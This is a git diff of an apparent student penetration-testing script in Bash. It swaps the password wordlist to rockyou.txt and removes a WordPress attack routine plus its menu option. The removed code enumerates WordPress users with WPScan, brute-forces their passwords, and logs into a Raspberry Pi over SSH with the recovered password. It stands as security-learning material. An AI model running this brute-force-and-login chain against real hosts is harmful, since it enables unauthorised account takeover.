@@ -39,7 +39,7 @@ extension="php" #Format: a,b,c
 threads=250
 
 #aircrack-ng password list
-passlist="/home/kali/Minor_Project/passwordlist.txt"
+passlist="/usr/share/wordlists/rockyou.txt"
 
 #TheHarvester Options
 source="all" #Options: baidu, bing, bingapi, bufferoverun, certspotter, crtsh, dnsdumpster, duckduckgo, exalead, github-code, google, hackertarget, hunter, intelx, linkedin, linkedin_links, netcraft, otx,pentesttools, projectdiscovery, qwant, rapiddns, securityTrails, spyse, sublist3r, threatcrowd, threatminer, trello, twitter, urlscan, virustotal, yahoo
@@ -648,42 +648,6 @@ vuln()
 	rm result.json result1.json result2.json result3.json result_4.json level.tmp sever1.tmp sever.tmp >& /dev/null
 }
 
-wpress()
-{
-	webiste=$(xmlstarlet sel -t -m '//port/service[@name="http" or @name="upnp"]' -v '../script[@id="http-generator"]/@output' -o " " -n "$file1" )
-
-	if [[ $(echo "$website" | grep "WordPress") ]]
-	then
-		echo -e ""
-		echo -e "${BYELLOW}[-]The Website is hosted on $website${NC}. Running WPScan."
-		echo -e "${BYELLOW}Enumerating Users:${NC}"
-		echo -e "${NC}"
-		use=$(wpscan --url "$ip" -e u --force --update | grep "User(s)" -A 4 | head -n -2 | tail -n +3)
-		use2="${use:13}"
-		echo -e "The following user(s) were found : $use2"
-		echo -e "${NC}"
-		echo -e "${BYELLOW}[-]Running a Password Attack on the website:"
-		echo -e "${NC}"
-		use3=$(wpscan --url "$ip" -U "$use2" -P /home/kali/Minor_Project/passwordlist.txt --force | grep "Username")
-		echo $use3 > tmp1.txt
-		str1=$(awk -F '[, ]' '/Username/ {print $3}' tmp1.txt)
-		str2=$(awk -F '[, ]' '/Username/ {print $6}' tmp1.txt)
-		echo -e "Found a valid combination:-"
-		echo -e ""
-		echo -e "User(s): \n$str1"
-		echo -e "\nPassword(s): \n$str2"
-		echo -e ""
-		echo -e "${BYELLOW}[-]Using the retrieved password as login credentials for the Raspberry Pi:"
-		echo -e "${NC}"
-		echo -e "We have a shell!"
-		echo ""
-		echo ""
-		sshpass -p "$str2" ssh -o stricthostkeychecking=no pi@"$ip" 
-	else
-		echo "No WordPress website was found :("
-	fi
-	rm tmp1.txt
-}
 
 pingSweep()
 {
@@ -1082,32 +1046,6 @@ vulnTCP()
 	echo
 }
 
-
-: <<COMMENT
-rPi()
-{
-	echo 
-	read -p $'\033[1;34mEnter An IP/Domain : '$'\033[0m' ip
-	echo 
-	echo "############################################################################################################"
-	echo -e ""
-	echo -e "------------------------------------------Hacking Raspberry Pi------------------------------------------------"
-	echo -e "${NC}"
-	echo "############################################################################################################"
-	echo ""
-	echo -e "${BYELLOW}[-]Starting NMAP Scan"
-	echo -e "${NC}"
-	file1="nmap_"$ip"_tcp.xml"
-	nmaprubyc &	
-	gobust
-	echo ""
-	wpress
-	echo ""
-	rm "$file1" >& /dev/null
-	
-}
-COMMENT
-
 fullScan()
 {
 	echo "##############################################################################################################"
@@ -1218,7 +1156,6 @@ echo "5.  NMAP TCP and First 1000 UDP ports"
 echo "6.  NMAP All Ports (includes UDP ports)"
 echo "7.  NMAP TCP Scan and Gobuster (All TCP ports + Gobuster)"
 echo "8.  NMAP TCP Scan And Vuln Analysis (All TCP Ports + NMAP Vuln Scan + Vulnerability Analysis)"
-#echo "8.  Minor Project (All TCP Ports + Gobuster + Website Enumeration + Hacking Raspberry Pi)"
 echo "9.  Full Scan (All TCP ports + NMAP Vuln Scan + Gobuster + Vulnerability Analysis)"
 echo "10. Full Comprehensive Scan (All Ports + NMAP Vuln Scan + Gobuster + Vulnerability Analysis)"
 echo "11. Gobuster"
@@ -1256,7 +1193,6 @@ scan_type()
 		tcpGobust
 	elif [ "$option" == "8" ]; then
 		vulnTCP
-		#rPi
 	elif [ "$option" == "9" ]; then
 		fullScan
 	elif [ "$option" == "10" ]; then
